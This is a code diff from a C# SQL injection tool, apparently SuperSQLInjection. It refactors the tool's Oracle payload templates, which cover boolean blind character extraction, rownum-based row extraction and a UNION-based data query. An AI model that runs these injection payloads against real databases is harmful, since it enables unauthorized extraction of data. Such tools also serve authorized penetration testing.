@@ -8,7 +8,7 @@ namespace SuperSQLInjection.payload
     class Oracle
     {
         //加载对应配置(需要读取的环境变量)
-        public static String path = "config/oracle/ver.txt";
+        public static String path = "config/vers/oracle.txt";
         public static List<String> vers = FileTool.readFileToList(path);
 
 
@@ -53,12 +53,13 @@ namespace SuperSQLInjection.payload
         public static String bool_value = " ascii(substr({data},{index},1))>{len}";
 
         //获取行数据
-        public static String data_value = "(select {data} from (select {allcolumns},rownum as limit from (select * from {dbname}.{table}))  where limit={index})";
+        public static String data_value = "(select {data} from (select {allcolumns},rownum as limit from {dbname}.{table})  where limit={index})";
 
 
         //union获取数据条数
-        public static String union_data_count = "(select count(*) from {dbname}.{table})";
-        public static String bool_datas_count = " " + union_data_count + ">={len}";
+        public static String data_count = "(select count(*) from {dbname}.{table})";
+
+        public static String bool_datas_count = " " + data_count + ">={len}";
 
         //union获取值
         public static String union_value = " 1=2 union all select {data} from dual";
@@ -153,16 +154,10 @@ namespace SuperSQLInjection.payload
         /// <param name="table">表名</param>
         /// <param name="index">下标</param>
         /// <returns></returns>
-        public static String getBoolDataPayLoad(String column,String orderby,String dbName, String table, int index)
+        public static String getBoolDataPayLoad(String column, String dbName, String table, int index)
         {
-            String data = setDataValue(column, orderby);
-            String payload = data.Replace("{dbname}", dbName).Replace("{table}", table).Replace("{data}", column).Replace("{index}", index.ToString());
+            String payload = data_value.Replace("{data}", column).Replace("{allcolumns}", column).Replace("{dbname}", dbName).Replace("{table}", table).Replace("{index}", index.ToString());
             return payload;
-        }
-
-        private static String setDataValue(String allColumns, String orderby)
-        {
-            return data_value.Replace("{allcolumns}", allColumns);
         }
 
         public static String getDataValue(List<String> columns, String dbName, String table, String index)
